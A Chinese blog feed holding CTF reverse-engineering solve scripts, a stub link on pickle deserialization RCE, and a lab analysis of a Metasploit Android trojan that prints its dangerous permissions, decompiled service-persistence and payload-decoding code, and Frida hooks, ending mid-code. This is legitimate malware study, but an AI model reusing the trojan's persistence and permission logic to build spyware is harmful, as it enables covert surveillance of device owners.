class="string">&#x27;58&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;59&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;59&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;60&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;60&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;61&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;61&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;62&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;62&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;63&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;63&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;64&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;64&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;65&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;66&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;66&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;65&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;67&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;67&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;68&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;68&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;69&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;69&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;70&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;70&#x27;</span> : <span class="string">&#x27;_&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;maple&#123;&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="built_in">print</span>(data_chr[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># maple&#123;no_type_system_is_safe_from_pl_grads_with_too_much_time_on_their_hands&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="artificial"><a class="markdownIt-Anchor" href="#artificial">#</a> Artificial</h3>
<p>jadx 逆不了，然后学长那里知道 GDA 这东西（确实好用）</p>
<p>逻辑还算简单，给了张表 [(x,y), value]，求出所有 value 和为 0x11dbe28 的 x,y，将 x,y 从小到大连起来，然后整个做 sha256，然后取前 16 位做 aes 的 key 解密获得 flag</p>
<p>但是数据规模是 3000 * 1e7, 目前说是题目有点问题？</p>
<h6 id="101-2109-增加了长度判断999"><a class="markdownIt-Anchor" href="#101-2109-增加了长度判断999">#</a> 10.1 21:09 增加了长度判断 999</h6>
<p><img loading="lazy" data-src="mapleCTF2023/image-20231001212212857.png" alt="image-20231001212212857"></p>
<p>…</p>
<p>感觉… 不好说…</p>
<h6 id="102结论这里是个最小生成树what"><a class="markdownIt-Anchor" href="#102结论这里是个最小生成树what">#</a> 10.2：结论：这里是个最小生成树，what？</h6>
<h6 id="先上脚本和前面分析的一样出来的东西排序sha256取前16位解密aes即可"><a class="markdownIt-Anchor" href="#先上脚本和前面分析的一样出来的东西排序sha256取前16位解密aes即可">#</a> 先上脚本，和前面分析的一样，出来的东西排序 + sha256 + 取前 16 位解密 AES 即可</h6>
<h6 id="但是为啥是最小生成树还得研究一下"><a class="markdownIt-Anchor" href="#但是为啥是最小生成树还得研究一下">#</a> 但是为啥是最小生成树，还得研究一下…</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;map.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">exec</span>(f.read())</span><br><span class="line"></span><br><span class="line">mp = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, x.split(<span class="string">&#x27;,&#x27;</span>))), mp))</span><br><span class="line">mp.sort(key = <span class="keyword">lambda</span> x : x[<span class="number">2</span>])</span><br><span class="line">fa = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">    fa.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> fa[x] == x:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    ret = find(fa[x])</span><br><span class="line">    fa[x] = ret</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">_a = []</span><br><span class="line"><span class="keyword">for</span> a, b, res <span class="keyword">in</span> mp:</span><br><span class="line">    ffa = find(a)</span><br><span class="line">    ffb = find(b)</span><br><span class="line">    <span class="keyword">if</span> (ffa == ffb):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    fa[ffa] = ffb</span><br><span class="line">    ans += res</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    _a.append(<span class="built_in">str</span>(a) + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(b) + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(res))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ans.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(_a))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>pickle反序列化</title>
    <url>/2023/09/18/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h6 id="preface-就是看看~"><a class="markdownIt-Anchor" href="#preface-就是看看~">#</a> PREFACE: 就是看看～</h6>
<span id="more"></span>
<p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始 python 反序列化攻击：pickle 原理解析 &amp; 不用 reduce 的 RCE 姿势 - 知乎 (zhihu.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>msf Android马分析</title>
    <url>/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h6 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> PREFACE:</h6>
<span id="more"></span>
<h3 id="一-运行效果以及环境搭建"><a class="markdownIt-Anchor" href="#一-运行效果以及环境搭建">#</a> 一、运行效果以及环境搭建</h3>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423141135014.png" alt="image-20240423141135014"></p>
<p>已知这个马上线安卓 13（我的测试机环境）是会被直接拦的，尝试了一下安卓 7</p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172223131.png" alt="image-20240423172223131"></p>
<p>可以上马，上的时候不会检测权限，但是 shell 不进去以及文件看不到，推测是权限管理系统拦了但是马没有申请，合理怀疑是安卓 6.0 以后需要动态申请权限，这里的马存在一定问题</p>
<p>这边上一个 android5，不行，报错</p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172154053.png" alt="image-20240423172154053"></p>
<p>上一个 android6，成功！</p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423173618493.png" alt="image-20240423173618493"></p>
<p>简单看一下我们的权限：</p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423183527824.png" alt="image-20240423183527824"></p>
<p>​		简单来说没什么用，大概研究一下应该是进应用沙箱了，但是权限是给满的，很奇怪，还是啥也干不了</p>
<h3 id="二-逆向分析"><a class="markdownIt-Anchor" href="#二-逆向分析">#</a> 二、逆向分析</h3>
<h5 id="androidmainfestxml"><a class="markdownIt-Anchor" href="#androidmainfestxml">#</a> AndroidMainfest.xml</h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SEND_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECORD_AUDIO&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CALL_PHONE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SETTINGS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CAMERA&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SET_WALLPAPER&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CALL_LOG&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_CALL_LOG&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera.autofocus&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.microphone&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>申请权限，注定这个马只能低版本使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.NoDisplay&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;my_host&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;metasploit&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:label</span>=<span class="string">&quot;MainBroadcastReceiver&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainBroadcastReceiver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainService&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>活动类名： <code>MainActivity</code></p>
<p>注册 intent：</p>
<ul>
<li><code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</code>  - 指定该活动为应用程序的主要入口点。</li>
<li><code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</code>  - 指定该活动为启动器活动，即显示在设备的应用程序列表中并且可由用户启动</li>
<li>指定了 <code>metasploit</code>  协议链接的主机和方案</li>
<li>等等</li>
</ul>
<h5 id="mainservice"><a class="markdownIt-Anchor" href="#mainservice">#</a> MainService</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    Class v0_2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        v0_2 = Class.forName(<span class="string">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class="line">        goto label_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(ClassNotFoundException v0_1) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        label_5:</span><br><span class="line">            <span class="type">Method</span> <span class="variable">v1</span> <span class="operator">=</span> v0_2.getMethod(<span class="string">&quot;currentApplication&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">v0_3</span> <span class="operator">=</span> (Context)v1.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span>(v0_3 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title class_">c</span>(v1));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            MainService.startService(v0_3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>尝试通过反射加载 <code>android.app.ActivityThread</code>  中的 <code>currentApplication</code>  方法并通过 <code>invoke</code>  执行，转化为 context 类型保存，如果获取不到 Context，则通过主线程的  <code>Handler</code>  将一个新的  <code>Runnable</code>  对象发送到消息队列中，以便在主线程中执行，c 中的逻辑为在运行时尝试通过之前传递进来的  <code>Method</code>  对象获取  <code>Context</code>  对象，并在获取成功时启动  <code>MainService</code>  服务</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">c</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Method a;</span><br><span class="line"></span><br><span class="line">    c(Method arg1) &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = arg1;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">v0_1</span> <span class="operator">=</span> (Context)<span class="built_in">this</span>.a.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span>(v0_1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                MainService.startService(v0_1);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>java 反射：<a href="https://developer.aliyun.com/article/812647">深入理解 Java 中的反射机制及使用原理！详细解析 invoke 方法的执行和使用 - 阿里云开发者社区 (aliyun.com)</a></p>
<ul>
<li>允许运行中的 Java 程序获取自身信息，并可以操作类或者对象的内部属性</li>
<li>程序中的对象一般都是在编译时就确定下来，Java 反射机制可以动态地创建对象并且调用相关属性，这些对象的类型在编译时是未知的</li>
<li>也就是说 ，可以通过反射机制<strong>直接创建对象，即使这个对象类型在编译时是未知的</strong></li>
</ul>
<p>类的加载机制：<strong>JVM</strong> 使用<strong> ClassLoader</strong> 将字节码文件，即 <strong>class</strong> 文件加载到方法区内存中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.mypackage.MyClass&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>ClassLoader</strong> 类根据类的完全限定名加载类并返回一个<strong> Class</strong> 对象</p>
<p>反射的用途：</p>
<ul>
<li>很多框架都是配置化的，通过<strong> XML</strong> 文件配置<strong> Bean</strong></li>
<li>为了保证框架的通用性，需要根据配置文件加载不同的对象或者类，调用不同的方法</li>
<li>要运用反射，运行时动态加载需要加载的对象</li>
</ul>
<p><strong>这里主要就是用③，实现动态加载，反射是各种容器实现的核心</strong></p>
<p>从类中获取一个方法后，可以使用<strong> invoke ()</strong> 来调用这个方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent arg2, <span class="type">int</span> arg3, <span class="type">int</span> arg4)</span> &#123;</span><br><span class="line">    Payload.start(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Service</code>  类的重写方法，用于处理启动服务的命令。 <code>1</code>  表示如果服务被杀死了，系统尝试重新创建服务并调用  <code>onStartCommand()</code>  方法；即这里会维持在后台循环启动 payload</p>
<p>我们知道，frida 会悬挂进程并多起四个线程（可以自行调试，这个地方还没有具体了解原理，不过需要注意）那么我们编辑运行基本的一个脚本就会观察到有</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">setImmediate</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lld [*]&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> myClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.metasploit.stage.MainActivity&quot;</span>);</span><br><span class="line">        myClass.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">v</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424133646117.png" alt="image-20240424133646117"></p>
<p>后台重新加载了几次 payload，使得 vps 重新接收到了 sessions，随即关闭掉前面的链接，可以认为我们的推断是基本正确的，这部分实现了马的持久化</p>
<p>测试 payload 的重加载：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">setImmediate</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lld [*]&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> myClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.metasploit.stage.MainService&quot;</span>);</span><br><span class="line">        myClass.<span class="property">onStartCommand</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg2, arg3, arg4</span>)&#123;</span><br><span class="line">            <span class="title function_">send</span>(<span class="string">&#x27;com.myclass.onStartCommand.implementation&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">onStartCommand</span>(arg2, arg3, arg4);</span><br><span class="line">            <span class="title function_">send</span>(<span class="string">&quot;result:&quot;</span>+<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<img loading="lazy" data-src="msf-Android马分析/image-20240424142410325.png" alt="image-20240424142410325" style="zoom:33%;">
<p>修改返回值，服务会快速重置，但是新的连接无法维持，原因是我们 hook 了返回值为 <code>START_NOT_STICKY</code></p>
<h5 id="payload"><a class="markdownIt-Anchor" href="#payload">#</a> Payload</h5>
<h6 id="class-b"><a class="markdownIt-Anchor" href="#class-b">#</a> class b</h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">a</span><span class="params">(<span class="type">byte</span>[] arg4, <span class="type">int</span> arg5)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(v0 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        v1 |= (arg4[v0 + arg5] &amp; <span class="number">0xFF</span>) &lt;&lt; (v0 &lt;&lt; <span class="number">3</span>);</span><br><span class="line">        ++v0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里明显是一个大小端序转化，基本上就是在对 payload 做数据处理，先大体手动还原符号，看起来就是简单编码还原 payload 内容并获取信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.metasploit.stage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">b</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> timestamp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        b.timestamp = TimeUnit.SECONDS.toMillis(<span class="number">1L</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">change_endian</span><span class="params">(<span class="type">byte</span>[] arg4, <span class="type">int</span> arg5)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            v1 |= (arg4[v0 + arg5] &amp; <span class="number">0xFF</span>) &lt;&lt; (v0 &lt;&lt; <span class="number">3</span>);</span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> a <span class="title function_">a</span><span class="params">(<span class="type">byte</span>[] arg11)</span> &#123;</span><br><span class="line">        <span class="type">a</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">a</span>();</span><br><span class="line">        v3.a = b.change_endian(arg11, <span class="number">0</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">v6</span> <span class="operator">=</span> (<span class="type">long</span>)b.change_endian(arg11, <span class="number">12</span>);</span><br><span class="line">        v3.b = b.timestamp * v6;</span><br><span class="line">        b.copy_array(arg11, <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">        b.copy_array(arg11, <span class="number">0x20</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">0x30</span>;</span><br><span class="line">        <span class="keyword">if</span>((v3.a &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            v3.c = b.encode(arg11, <span class="number">8000</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(arg11[v0] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">g</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">g</span>();</span><br><span class="line">            v4.a = b.encode(arg11, 